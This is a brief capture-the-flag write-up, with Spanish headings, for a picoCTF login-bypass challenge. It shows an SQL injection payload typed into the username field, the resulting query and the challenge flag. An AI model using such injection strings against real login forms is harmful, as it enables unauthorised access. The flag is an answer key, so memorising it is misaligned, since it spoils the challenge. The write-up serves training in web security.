## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849
## Hints
- The password is being filtered.
## Solución

![[Pasted image 20230314085141.png]]
```
username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}

```

## Notas Adicionales



## Referencias